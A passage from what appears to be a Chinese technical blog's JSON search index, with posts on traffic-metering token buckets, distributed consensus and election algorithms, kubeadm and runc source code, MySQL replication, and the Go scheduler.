Meter有两种工作模式：色盲模式，非色盲模式 如果工作在色盲模式下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶C足以让B通过，则tag此包为绿色，并减去对应的Tc；若C不足以让B通过而E足以让B通过，则tag此包为黄色，并减去对应的Te；否则tag此包为红色。 如果工作在非色盲模式下，大小为B字节的包在t时间到达，算法工作如下：若包先前tag成绿色，且令牌桶C足以让B通过，则此包依旧tag成绿色，减去对应的Tc；若令牌桶C不足以让B通过，且该包先前tag的是绿色或黄色，且令牌桶E足以让B通过，就tag成黄色，并减去对应的Te；否则（两种情况：先前此包tag成红色或令牌桶E不足以让B通过）tag为红色。 tcTCMTwo Rate Three Color Marker ，双速率三颜色标记 四个参数： Peak Information Rate (PIR)，峰值信息率。 Peak Burst Size (PBS)，峰值Burst大小。 Committed Information Rate (CIR)，提交信息率。 Committed Burst Size (CBS)，提交Burst大小。 PIR和CIR用于表示每秒IP包的字节数。PBS和CBS以字节为单位，必须大于0，推荐设置成大于当前路径MTU。 Meter同样分为色盲模式和非色盲模式。 如果工作在色盲模式下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶P不足以让B通过，则tag为红色，否则：若令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过，则tag为绿色且同时扣除桶C和桶P的令牌。 如果工作在非色盲模式下，大小为B字节的包在t时间到达，算法工作如下：若先前tag成红色，或令牌桶P不足以让B通过，则tag为红色，否则：若先前tag成黄色，或令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过且先前标记成绿色，则tag为绿色且同时扣除桶C和桶P的令牌。 srTCM算法是根据 length of burst 来进行限速的。“单速率”指的是这个算法里两个令牌桶的增长速率都是一样的每秒CIR。两个令牌桶拥有不同的大小，就好像一条数轴用两个点分成了三个阶段，对应绿、黄、红。 trTCM的“双速率”是指两个令牌桶有不同的增长速率。增长的较慢的令牌桶是发放绿色标记的较为严苛的指标，增长的较快的令牌桶是一个下限，若这个令牌桶也handle不过来的流量就要无情的tag为红色，两者之间的就是黄色。 参考https://wayjam.me/posts/ratelimit-with-redis-lua/ https://www.cnblogs.com/ZCplayground/p/9451935.html","categories":[{"name":"分布式","slug":"分布式","permalink":"http://www.yorzorzy.xyz/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"分布式","slug":"分布式","permalink":"http://www.yorzorzy.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"}]},{"title":"分布式选主算法","slug":"分布式选主算法","date":"2020-06-22T06:43:56.294Z","updated":"2020-06-22T06:43:56.294Z","comments":true,"path":"2020/06/22/分布式选主算法/","link":"","permalink":"http://www.yorzorzy.xyz/2020/06/22/%E5%88%86%E5%B8%83%E5%BC%8F%E9%80%89%E4%B8%BB%E7%AE%97%E6%B3%95/","excerpt":"","text":"分布式选主算法Bully Algorithm(霸道选举算法)霸道选举算法是一种分布式选举算法，每次都会选出存活的进程中ID最大的候选者。 霸道选举算法的假设霸道选举算法的假设包括： 假设了可靠的通道通信，更进一步的假设是系统中任何两个进程之间都可以通信。 每个进程都知道其他进程的编号，也就是说算法依赖一个全局的数据。 假设进程能够明确地判断出一个正常运行的进程和一个已经崩溃的进程。 霸道选举算法的选举流程选举过程中会发送以下三种消息类型： Election消息：表示发起一次选举 Answer(Alive)消息：对发起选举消息的应答 Coordinator(Victory)消息：选举胜利者向参与者发送选举成功消息 触发选举流程的事件包括： 当进程P从错误中恢复 检测到Leader失败 选举流程： 如果P是最大的ID，直接向所有人发送Victory消息，成功新的Leader；否则向所有比他大的ID的进程发送Election消息 如果P再发送Election消息后没有收到Alive消息，则P向所有人发送Victory消息，成功新的Leader 如果P收到了从比自己ID还要大的进程发来的Alive消息，P停止发送任何消息，等待Victory消息（如果过了一段时间没有等到Victory消息，重新开始选举流程） 如果P收到了比自己ID小的进程发来的Election消息，回复一个Alive消息，然后重新开始选举流程 如果P收到Victory消息，把发送者当做Leader Ring-based节点在环上击鼓传花式的通信。 PaxosPaxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。 基础角色 Proposer：议案发起者。 Acceptor：决策者，可以批准议案。 Learner：最终决策的学习者。 在具体的实现中，一个进程可能同时充当多种角色。比如一个进程可能既是Proposer又是Acceptor又是Learner。Proposer负责提出提案，Acceptor负责对提案作出裁决（accept与否），learner负责学习提案结果。还有一个很重要的概念叫提案（Proposal）。最终要达成一致的value就在提案里。只要Proposer发的提案被Acceptor接受（半数以上的Acceptor同意才行），Proposer就认为该提案里的value被选定了。Acceptor告诉Learner哪个value被选定，Learner就认为那个value被选定。只要Acceptor接受了某个提案，Acceptor就任务该提案里的value被选定了。 为了避免单点故障，会有一个Acceptor集合，Proposer想Acceptor集合发送提案，Acceptor集合中的每个成员都有可能同意该提案且每个Acceptor只能批准一个提案，只有当一半以上的成员同意了一个提案，就认为该提案被选定了。 Paxos算法的过程阶段一（prepare阶段）：(a) Proposer选择一个提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。Pareper（N）(b) 如果一个Acceptor收到一个编号为N的Prepare请求，如果小于它已经响应过的请求，则拒绝，不回应或回复error。若N大于该Acceptor已经响应过的所有Prepare请求的编号（maxN），那么它就会将它已经接受过（已经经过第二阶段accept的提案）的编号最大的提案（如果有的话，如果还没有的accept提案的话返回{pok，null，null}）作为响应反馈给Proposer，同时该Acceptor承诺不再接受任何编号小于N的提案。 阶段二（accept阶段）：(a) 如果一个Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应，那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor。注意：V就是收到的响应中编号最大的提案的value（某个acceptor响应的它已经通过的{acceptN，acceptV}），如果响应中不包含任何提案，那么V就由Proposer自己决定。(b) 如果Acceptor收到一个针对编号为N的提案的Accept请求，只要该Acceptor没有对编号大于N的Prepare请求做出过响应，它就接受该提案。如果N小于Acceptor以及响应的prepare请求，则拒绝，不回应或回复error（当proposer没有收到过半的回应，那么他会重新进入第一阶段，递增提案号，重新提出prepare请求）。在上面的运行过程中，每一个Proposer都有可能会产生多个提案。但只要每个Proposer都遵循如上述算法运行，就一定能保证算法执行的正确性。 raft基础角色 Raft通过选举Leader并由Leader节点负责管理日志复制来实现多副本的一致性。 在Raft中，节点有三种角色： Leader：负责接收客户端的请求，将日志复制到其他节点并告知其他节点何时应用这些日志是安全的 Candidate：用于选举Leader的一种角色 Follower：负责响应来自Leader或者Candidate的请求 角色转换如下图所示： 所有节点初始状态都是Follower角色 超时时间内没有收到Leader的请求则转换为Candidate进行选举 Candidate收到大多数节点的选票则转换为Leader；发现Leader或者收到更高任期的请求则转换为Follower Leader在收到更高任期的请求后转换为Follower 任期 Raft把时间切割为任意长度的任期，每个任期都有一个任期号，采用连续的整数。 每个任期都由一次选举开始，若选举失败则这个任期内没有Leader；如果选举出了Leader则这个任期内有Leader负责集群状态管理。 节点的执行规则 所有节点 如果commitIndex &gt; lastApplied，应用log[lastApplied]到状态机，增加lastApplied 如果RPC请求或者响应包含的任期T &gt; currentTerm，将currentTerm设置为T并转换为Follower Followers 响应来自Leader和Candidate的RPC请求 如果在选举超时周期内没有收到AppendEntries的请求或者给Candidate投票，转换为Candidate角色 Candidates 转换为candidate角色，开始选举： 递增currentTerm 给自己投票 重置选举时间 发送RequestVote给其他所有节点 如果收到了大多数节点的选票，转换为Leader节点 如果收到Leader节点的AppendEntries请求，转换为Follower节点 如果选举超时，重新开始新一轮的选举 Leaders 一旦选举完成：发送心跳给所有节点；在空闲的周期内不断发送心跳保持Leader身份 如果收到客户端的请求，将日志追加到本地log，在日志被应用到状态机后响应给客户端 如果对于一个跟随者，最后日志条目的索引值大于等于 nextIndex，那么：发送从 nextIndex 开始的所有日志条目： 如果成功：更新相应跟随者的 nextIndex 和 matchIndex 如果因为日志不一致而失败，减少 nextIndex 重试 如果存在一个满足N &gt; commitIndex的 N，并且大多数的matchIndex[i] ≥ N成立，并且log[N].term == currentTerm成立，那么令commitIndex等于这个N totem协议totem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。 galera和corosync就是基于这个协议来实现。 gossip协议简单的描述下这个协议，首先要传播谣言就要有种子节点。种子节点每秒都会随机向其他节点发送自己所拥有的节点列表，以及需要传播的消息。任何新加入的节点，就在这种传播方式下很快地被全网所知道。这个协议的神奇就在于它从设计开始就没想到信息一定要传递给所有的节点，但是随着时间的增长，在最终的某一时刻，全网会得到相同的信息。当然这个时刻可能仅仅存在于理论，永远不可达。","categories":[{"name":"分布式","slug":"分布式","permalink":"http://www.yorzorzy.xyz/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"分布式","slug":"分布式","permalink":"http://www.yorzorzy.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"}]},{"title":"kubeadm原理分析","slug":"kubernetes_adm源码分析","date":"2020-06-22T05:33:15.965Z","updated":"2020-06-22T05:33:15.965Z","comments":true,"path":"2020/06/22/kubernetes_adm源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/06/22/kubernetes_adm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"kubeadm原理分析介绍kubeadm是Kubernetes 1.4开始新增的特性，用于快速搭建Kubernetes集群环境，两个命令就能把一个k8s集群搭建起来。之前广为诟病的“k8s环境搭建难”的问题，很快得到突破性的解决。本博文基于kubernetes v1.5.0源码对kubeadm工作原理和流程的分析，一窥其内部的工作流。 执行流程 主要工作介绍kubeadm init主要工作：创建集群安全相关的的key、certs和conf文件。创建kube-apiserver、kube-controller-manager、kube-scheduler、etcd(如果没有配置external etcd)这些static pod的json格式的manifest文件，kubelet负责启动这些master组件。通过addons方式启动kube-discovery deployment、kube-proxy daemonSet、kube-dns deployment kubeadm join主要负责创建kubelet.conf，使kubelet能与API Server建立连接：访问kube-discovery服务获取cluster info（包含cluster ca证书、API Server endpoint列表和token。利用定的token，检验cluster info的签名。检验成功后，再与API Server建立连接，请求API Server为该node创建证书。根据获取到的证书创建kubelet.conf。 分析源码分析： 12345func main() &#123; if err := app.Run(); err != nil &#123; os.Exit(1) &#125;&#125; 执行run函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// NewKubeadmCommand returns cobra.Command to run kubeadm commandfunc NewKubeadmCommand(in io.Reader, out, err io.Writer) *cobra.Command &#123; var rootfsPath string cmds := &amp;cobra.Command&#123; Use: \"kubeadm\", Short: \"kubeadm: easily bootstrap a secure Kubernetes cluster\", Long: dedent.Dedent(` ┌──────────────────────────────────────────────────────────┐ │ KUBEADM │ │ Easily bootstrap a secure Kubernetes cluster │ │ │ │ Please give us feedback at: │ │ https://github.com/kubernetes/kubeadm/issues │ └──────────────────────────────────────────────────────────┘ Example usage: Create a two-machine cluster with one control-plane node (which controls the cluster), and one worker node (where your workloads, like Pods and Deployments run). ┌──────────────────────────────────────────────────────────┐ │ On the first machine: │ ├──────────────────────────────────────────────────────────┤ │ control-plane# kubeadm init │ └──────────────────────────────────────────────────────────┘ ┌──────────────────────────────────────────────────────────┐ │ On the second machine: │ ├──────────────────────────────────────────────────────────┤ │ worker# kubeadm join &lt;arguments-returned-from-init&gt; │ └──────────────────────────────────────────────────────────┘ You can then repeat the second step on as many other machines as you like. `), PersistentPreRunE: func(cmd *cobra.Command, args []string) error &#123; if rootfsPath != \"\" &#123; if err := kubeadmutil.Chroot(rootfsPath); err != nil &#123; return err &#125; &#125; return nil &#125;, &#125; cmds.ResetFlags() cmds.AddCommand(NewCmdCompletion(out, \"\")) cmds.AddCommand(NewCmdConfig(out)) cmds.AddCommand(NewCmdInit(out, nil)) cmds.AddCommand(NewCmdJoin(out, nil)) cmds.AddCommand(NewCmdReset(in, out, nil)) cmds.AddCommand(NewCmdVersion(out)) cmds.AddCommand(NewCmdToken(out, err)) cmds.AddCommand(upgrade.NewCmdUpgrade(out)) cmds.AddCommand(alpha.NewCmdAlpha(in, out)) options.AddKubeadmOtherFlags(cmds.PersistentFlags(), &amp;rootfsPath) return cmds&#125; dry-run表示测试，不真正执行命令","categories":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/categories/k8s/"}],"tags":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/tags/k8s/"}]},{"title":"mysql主从复制原理","slug":"mysql双主复制原理","date":"2020-06-19T06:00:28.488Z","updated":"2020-06-19T06:00:28.488Z","comments":true,"path":"2020/06/19/mysql双主复制原理/","link":"","permalink":"http://www.yorzorzy.xyz/2020/06/19/mysql%E5%8F%8C%E4%B8%BB%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86/","excerpt":"","text":"mysql主从复制原理[toc] 介绍在2000年，MySQL 3.23.15版本引入了Replication。Replication作为一种准实时同步方式，得到广泛应用。 这个时候的Replicaton的实现涉及到两个线程，一个在Master，一个在Slave。Slave的I/O和SQL功能是作为一个线程，从Master获取到event后直接apply，没有relay log。这种方式使得读取event的速度会被Slave replay速度拖慢，当主备存在较大延迟时候，会导致大量binary log没有备份到Slave端。 在2002年，MySQL 4.0.2版本将Slave端event读取和执行独立成两个线程（IO线程和SQL线程），同时引入了relay log。IO线程读取event后写入relay log，SQL线程从relay log中读取event然后执行。这样即使SQL线程执行慢，Master的binary log也会尽可能的同步到Slave。当Master宕机，切换到Slave，不会出现大量数据丢失。 MySQL在2010年5.5版本之前，一直采用的是异步复制。主库的事务执行不会管备库的同步进度，如果备库落后，主库不幸crash，那么就会导致数据丢失。 MySQL在5.5中引入了半同步复制，主库在应答客户端提交的事务前需要保证至少一个从库接收并写到relay log中。那么半同步复制是否可以做到不丢失数据呢。 在2016年，MySQL在5.7.17中引入了Group Replication。 几种复制协议差别 对于异步复制，主库将事务Binlog事件写入到Binlog文件中，此时主库只会通知一下Dump线程发送这些新的Binlog，然后主库就会继续处理提交操作，而此时不会保证这些Binlog传到任何一个从库节点上。 对于全同步复制，当主库提交事务之后，所有的从库节点必须收到，APPLY并且提交这些事务，然后主库线程才能继续做后续操作。这里面有一个很明显的缺点就是，主库完成一个事务的时间被拉长，性能降低。 对于半同步复制，是介于全同步复制和异步复制之间的一种，主库只需要等待至少一个从库节点收到并且Flush Binlog到Relay Log文件即可，主库不需要等待所有从库给主库反馈。同时，这里只是一个收到的反馈，而不是已经完全执行并且提交的反馈，这样就节省了很多时间。 异步复制异步复制也就是说的mysql的主从复制，叫replication。 复制存在的问题： 宕机情况下，可能存在数据丢失情况 从库只有一个sql线程，主库写压力大时候，复制延迟 基本原理介绍： mysql主从复制是一个异步复制的过程。从一个实例（master）复制到另一个实例（slave），整个过程要由master上的I/O进程和slave上的sql进程和I/O进程共同完成。 首先master必须打开binary log(bin-log),因为整个复制过程实际上就是slave端从master端获取相应的二进制日志，然后在本地完全顺序的执行日志中纪录的各种操作。 主从复制过程： Slave 端的 IO 进程连接上 Master，向 Master 请求指定日志文件的指定位置（或者从最开始的日志）之后的日志内容； Master 接收到来自 Slave 的 IO 进程的请求后，负责复制的 IO 进程根据 Slave 的请求信息，读取相应日志内容，返回给 Slave 的IO进程，并将本次请求读取的 bin-log 文件名及位置一起返回给 Slave 端 Slave 端的 IO 进程接收到信息后，将接收到的日志内容依次添加到 Slave 端的 relay-log(中继日志) 文件的最末端，并将读取到的 Master 端的 bin-log 的文件名和位置记录到 master-info 文件中，以便在下一次读取的时候能够清楚的告诉 Master ：”我需要从某个 bin-log 的哪个位置开始往后的日志内容，请发给我”； Slave 端的 Sql 进程检测到 relay-log (中继日志)中新增加了内容后，会马上解析 relay-log 的内容成为在 Master 端真实执行时候的那些可执行的内容，并在本地执行。 复制拓扑： 参数说明： 1234567891011121314151617181920212223skip-name-resolve # 跳过域名slave_parallel_workers &#x3D; &#96;&#96;8 # 并行复制工作线程slave_parallel_type&#x3D; logical_clock # 并行复制组提交并行复制max_connections &#x3D; &#96;&#96;8192 # 最大连接数server-id&#x3D;&#96;&#96;2 # 服务idauto_increment_offset&#x3D;&#96;&#96;2 # 自增偏移，两节点设置偶数和奇数auto_increment_increment&#x3D;&#96;&#96;2 # 自增log-bin &#x3D; mysql-bin # 日志max_binlog_size&#x3D;1024M # 最大binlog日志大小replicate-ignore-db &#x3D; mysql #忽略同步数据库replicate-ignore-db &#x3D; information_schemareplicate-ignore-db &#x3D; performance_schemareplicate-ignore-db &#x3D; testbind-address&#x3D;&#96;&#96;10.130&#96;&#96;.&#96;&#96;232.91 # 地址max_allowed_packet &#x3D; 500M #最大数据包interactive_timeout &#x3D; &#96;&#96;120 #交互超时wait_timeout &#x3D; &#96;&#96;120 # 连接wait超时log_warnings&#x3D;&#96;&#96;1 # 日志warningsnet_read_timeout&#x3D;&#96;&#96;600 # 数据读取超时时间net_write_timeout&#x3D;&#96;&#96;600 # 数据写入超时时间character-set-server &#x3D; utf8 # 编码validate_password_policy&#x3D;LOW # 密码铭感slave-skip-errors&#x3D;all # slave跳过所有错误 半同步复制半同步复制原理图： master将每个事务写入binlog（sync_binlog=1），传递到slave刷新到磁盘(sync_relay=1)，同时主库提交事务（commit）。master等待slave反馈收到relay log，只有收到ACK后master才将commit OK结果反馈给客户端。 半同步具体特性： 从库会在连接到主库时告诉主库，它是不是配置了半同步。 如果半同步复制在主库端是开启了的，并且至少有一个半同步复制的从库节点，那么此时主库的事务线程在提交时会被阻塞并等待，结果有两种可能，要么至少一个从库节点通知它已经收到了所有这个事务的Binlog事件，要么一直等待直到超过配置的某一个时间点为止，而此时，半同步复制将自动关闭，转换为异步复制。 从库节点只有在接收到某一个事务的所有Binlog，将其写入并Flush到Relay Log文件之后，才会通知对应主库上面的等待线程。 如果在等待过程中，等待时间已经超过了配置的超时时间，没有任何一个从节点通知当前事务，那么此时主库会自动转换为异步复制，当至少一个半同步从节点赶上来时，主库便会自动转换为半同步方式的复制。 半同步复制必须是在主库和从库两端都开启时才行，如果在主库上没打开，或者在主库上开启了而在从库上没有开启，主库都会使用异步方式复制。 一致性问题分析： 半同步方式，主库在等待备库ack时候，如果超时会退化为异步，这就可能导致数据丢失。在接下来分析中，先假设rpl_semi_sync_master_timeout足够大，不会退化为异步方式。 1)rpl_semi_sync_master_wait_point配置 参考资料源码分析得： rpl_semi_sync_master_wait_point分为：WAIT_AFTER_COMMIT和WAIT_AFTER_SYNC 配置after_commit： 即在等待Slave ACK时候，虽然没有返回当前客户端，但事务已经提交，其他客户端会读取到已提交事务。如果Slave端还没有读到该事务的events，同时主库发生了crash，然后切换到备库。那么之前读到的事务就不见了，出现了幻读。 配置after_sync: 在调用binlog sync之后，engine层commit之前等待Slave ACK。这样只有在确认Slave收到事务events后，事务才会提交。在commit之前等待Slave ACK，同时可以堆积事务，利于group commit，有利于提升性能。 2）after_sync和after_commit配置分析： WAIT_AFTER_SYNC和WAIT_AFTER_COMMIT两图中Send Events的位置，也可能导致主备数据不一致，出现同步失败的情形。实际在rpl_semi_sync_master_wait_point分析的图中是sync binlog大于1的情况。根据上面源码，流程如下图所示。Master依次执行flush binlog， update binlog position， sync binlog。如果Master在update binlog position后，sync binlog前掉电，Master再次启动后原事务就会被回滚。但可能出现Slave获取到Events，这也会导致Slave数据比Master多，主备同步失败。 由于上面的原因，sync_binlog设置为1的时候，MySQL会update binlog end pos after sync。流程如下图所示。这时候，对于每一个事务都需要sync binlog，同时sync binlog和网络发送events会是一个串行的过程，性能下降明显。 3）sync_relay_log配置 在Slave的IO线程中get_sync_period获得的是sync_relay_log的值，与sync_binlog对sync控制一样。当sync_relay_log不是1的时候，semisync返回给Master的position可能没有sync到磁盘。在gtid_mode下，在保证前面两个配置正确的情况下，sync_relay_log不是1的时候，仅发生Master或Slave的一次Crash并不会发生数据丢失或者主备同步失败情况。如果发生Slave没有sync relay log，Master端事务提交，客户端观察到事务提交，然后Slave端Crash。这样Slave端就会丢失掉已经回复Master ACK的事务events。 并行优化MySQL5.6提出并行复制，官方称为为enhanced multi-threaded slave（简称MTS） MySQL的主备同步是通过binlog在备库重放进行的，IO线程把主库binlog拉过去存入relaylog，然后SQL线程重放 relaylog 中的event，然而这种模式有一个问题就是SQL线程只有一个，在主库压力大的时候，备库单个SQL线程是跑不过主库的多个用户线程的，这样备库延迟是不可避免的。为了解决这种n对1造成的备库延迟问题，5.6 引入了并行复制机制，即SQL线程在执行的时候可以并发跑。 在MySQL 5.6版本之前，Slave服务器上有两个线程I/O线程和SQL线程。I/O线程负责接收二进制日志（更准确的说是二进制日志的event），SQL线程进行回放二进制日志。如果在MySQL 5.6版本开启并行复制功能，那么SQL线程就变为了coordinator线程，coordinator线程主要负责以前两部分的内容： 若判断可以并行执行，那么选择worker线程执行事务的二进制日志 若判断不可以并行执行，如该操作是DDL，亦或者是事务跨schema操作，则等待所有的worker线程执行完成之后，再执行当前的日志 coordinator线程并不是仅将日志发送给worker线程，自己也可以回放日志，但是所有可以并行的操作交付由worker线程完成。coordinator线程与worker是典型的生产者与消费者模型。 MySQL 5.7基于组提交的并行复制： MySQL 5.7才可称为真正的并行复制，这其中最为主要的原因就是slave服务器的回放与主机是一致的即master服务器上是怎么并行执行的slave上就怎样进行并行回放。不再有库的并行复制限制，对于二进制日志格式也无特殊的要求（基于库的并行复制也没有要求）。 MySQL 5.7并行复制的思想简单易懂，一言以蔽之： 一个组提交的事务都是可以并行回放 ，因为这些事务都已进入到事务的prepare阶段，则说明事务之间没有任何冲突（否则就不可能提交）。 为了兼容MySQL 5.6基于库的并行复制，5.7引入了新的变量slave-parallel-type，其可以配置的值有： DATABASE：默认值，基于库的并行复制方式 LOGICAL_CLOCK：基于组提交的并行复制方式 并行复制配置调优： master_info_repository： 开启MTS功能后，务必将参数master_info_repostitory设置为TABLE，这样性能可以有50%~80%的提升。 开启enhanced multi-threaded slave： 12345slave-parallel-type&#x3D;LOGICAL_CLOCKslave-parallel-workers&#x3D;16master_info_repository&#x3D;TABLErelay_log_info_repository&#x3D;TABLErelay_log_recovery&#x3D;ON 虽然mysql5.7添加MTS后，虽然slave可以并行应用relay log，但commit部分仍然是顺序提交，其中可能会有等待的情况。当开启slave_preserve_commit_order参数后，slave_parallel_type只能是LOGICAL_CLOCK，如果你有使用级联复制，那`LOGICAL_CLOCK可能会使离master越远的slave并行性越差。 group replicationMySQL Group Replication（简称MGR）是MySQL官方于2016年12月推出的一个全新的高可用与高扩展的解决方案。MySQL组复制提供了高可用、高扩展、高可靠的MySQL集群服务。 高一致性，基于原生复制及paxos协议的组复制技术，并以插件的方式提供，提供一致数据安全保证； 需要选主来保证集群一致性，相比galera，没有galera一致性强。 双主复制双主的方式和互为主从的实现原理一致，不过是互为主从。 双主架构思路： 1.两台mysql都可读写，互为主备，默认只使用一台（masterA）负责数据的写入，另一台（masterB）备用； 2.masterA是masterB的主库，masterB又是masterA的主库，它们互为主从； 3.所有提供服务的从服务器与masterB进行主从同步（双主多从）; 4.建议采用高可用策略的时候，masterA或masterB均不因宕机恢复后而抢占VIP（非抢占模式）； 这样做可以在一定程度上保证主库的高可用,在一台主库down掉之后,可以在极短的时间内切换到另一台主库上（尽可能减少主库宕机对业务造成的影响），减少了主从同步给线上主库带来的压力； 不足： masterB可能会一直处于空闲状态 主库后面提供服务的从库要等masterB先同步完了数据后才能去masterB上去同步数据，这样可能会造成一定程度的同步延时； 脏数据问题 并发优化：mysql基于5.7.21版本，在这个基础上增加了组并发回放的机制，能够更加快的同步数据。相比于异步复制的方式好一些。 同步一致性问题： 1）相同步长免冲突 2）上游生成ID避冲突 3）定期进行主从一致性检验 遇到的问题： 1）多节点写入问题：mysql互为主从的环境，更新一条语句同时提交，update一条记录同时提交，有主键的情况下，sql_thread是根据主键匹配行记录，不会校验行数据，所以m1更新了m2中表的记录，m2更新了m1中表的记录。update一条记录同时提交，有没有主键的情况下，sql_thread是根据全表扫描匹配行记录，所以m1更新在m2中找不到需要更新的行，报1032错误，m2更新在m1中找不到需要更新的行，也报1032错误。 2）1062错误， 主键冲突，出现这种情况就是从库出现插入操作，主库又重新来了一遍，iothread没问题，sqlthread出错 3）1032错误，现在生产库中好多数据，在从库误删了，生产库更新后找不到了，现在主从不同步了，再跳过错误也没用，因为没这条，再更新还会报错， 4）遇到最多的就是从库数据被修改之后，无法保证一致了。 总结mysql不同复制协议在一致性方面所有差异，但是总体看来在某些场景下，存在不一致的问题。需要针对具体情况去解决分析和优化方案。 半同步复制虽然增加了ack确认的机制，但是在一些场景下依然存在数据一致性的问题。 双主方案可以在一些对数据一致性不高的环境中使用，存在数据不一致的情况，需要针对不同的情况进行处理。相比galera多主和group replication的方案较差。 参考资料数据库月报：http://mysql.taobao.org/monthly/2017/04/01/","categories":[{"name":"mysql","slug":"mysql","permalink":"http://www.yorzorzy.xyz/categories/mysql/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.yorzorzy.xyz/tags/mysql/"}]},{"title":"go协程调度机制","slug":"go协程调度机制","date":"2020-06-19T05:22:35.694Z","updated":"2020-06-19T05:22:35.694Z","comments":true,"path":"2020/06/19/go协程调度机制/","link":"","permalink":"http://www.yorzorzy.xyz/2020/06/19/go%E5%8D%8F%E7%A8%8B%E8%B0%83%E5%BA%A6%E6%9C%BA%E5%88%B6/","excerpt":"","text":"go协程调度机制介绍Processor（简称 P） goroutine（简称 G） 系统线程（简称 M） ⾸先是 Processor（简称 P），其作⽤类似 CPU 核，⽤来控制可同时并发执⾏的任务数量。每个⼯作线程都必须绑定⼀个有效 P 才被允许执⾏任务，否则只能休眠，直到有空闲 P 时被唤醒。P 还为线程提供执⾏资源，⽐如对象分配内存、本地任务队列等。线程独享所绑定的 P 资源，可在⽆锁状态下执⾏⾼效操作。基本上，进程内的⼀切都在以 goroutine（简称 G）⽅式运⾏，包括运⾏时相关服务，以及main.main ⼊⼜函数。需要指出，G 并⾮执⾏体，它仅仅保存并发任务状态，为任务执⾏提供所需栈内存空间。G 任务创建后被放置在 P 本地队列或全局队列，等待⼯作线程调度执⾏。 实际执⾏体是系统线程（简称 M），它和 P 绑定，以调度循环⽅式不停执⾏ G 并发任务。M 通过修改寄存器，将执⾏栈指向 G ⾃带栈内存，并在此空间内分配堆栈帧，执⾏任务函数。当需要中途切换时，只要将相关寄存器值保存回 G 空间即可维持状态，任何 M 都可据此恢复执⾏。线程仅负责执⾏，不再持有状态，这是并发任务跨线程调度，实现多路复⽤的根本所在。 尽管 P/M 构成执⾏组合体，但两者数量并⾮⼀⼀对应。通常情况下，P 数量相对恒定，默认与 CPU 核数量相同，但也可能更多或更少，⽽ M 则是调度器按需创建。举例来说，当M 因陷⼊系统调⽤⽽长时间阻塞时，P 就会被监控线程抢回，去新建（或唤醒）⼀个 M 执⾏其他任务，如此 M 的数量就会增长。 因为 G 初始栈仅有 2KB，且创建操作只是在⽤户空间简单的对象分配，远⽐进⼊内核态分配线程要简单得多。调度器让多个 M 进⼊调度循环，不停获取并执⾏任务，所以我们才能创建成千上万个并发任务","categories":[{"name":"golang","slug":"golang","permalink":"http://www.yorzorzy.xyz/categories/golang/"}],"tags":[{"name":"golang","slug":"golang","permalink":"http://www.yorzorzy.xyz/tags/golang/"}]},{"title":"runc原理学习","slug":"runc原理学习","date":"2020-03-31T03:52:51.552Z","updated":"2020-03-31T03:02:36.000Z","comments":true,"path":"2020/03/31/runc原理学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/03/31/runc%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"runc原理学习1. 代码结构 2. 原理分析从create -&gt; start -&gt; run-&gt; stop来分析： createCommand代码入口： 1234567891011121314Action: func(context *cli.Context) error &#123; spec, err := setupSpec(context) if err != nil &#123; return err &#125; status, err := startContainer(context, spec, true) // 开启容器 if err != nil &#123; return err &#125; // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) return nil &#125;, startContainter: 123456789101112131415161718192021222324252627func startContainer(context *cli.Context, spec *specs.Spec, create bool) (int, error) &#123; id := context.Args().First() if id == \"\" &#123; return -1, errEmptyID &#125; container, err := createContainer(context, id, spec) if err != nil &#123; return -1, err &#125; detach := context.Bool(\"detach\") // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File&#123;&#125; if os.Getenv(\"LISTEN_FDS\") != \"\" &#123; listenFDs = activation.Files(false) &#125; r := &amp;runner&#123; enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: true, container: container, listenFDs: listenFDs, console: context.String(\"console\"), detach: detach, pidFile: context.String(\"pid-file\"), create: create, &#125; return r.run(&amp;spec.Process)&#125; 调用函数createContainer，然后返回初始化之后的runner结构体。 createContainer函数： 123456789101112131415161718192021222324252627func createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) &#123; config, err := specconv.CreateLibcontainerConfig(&amp;specconv.CreateOpts&#123; CgroupName: id, UseSystemdCgroup: context.GlobalBool(\"systemd-cgroup\"), NoPivotRoot: context.Bool(\"no-pivot\"), NoNewKeyring: context.Bool(\"no-new-keyring\"), Spec: spec, &#125;) //读取配置文件 if err != nil &#123; return nil, err &#125; // 查看rootfs的状态 if _, err := os.Stat(config.Rootfs); err != nil &#123; if os.IsNotExist(err) &#123; return nil, fmt.Errorf(\"rootfs (%q) does not exist\", config.Rootfs) &#125; return nil, err &#125; //加载factory factory, err := loadFactory(context) if err != nil &#123; return nil, err &#125; //创建factory return factory.Create(id, config)&#125; 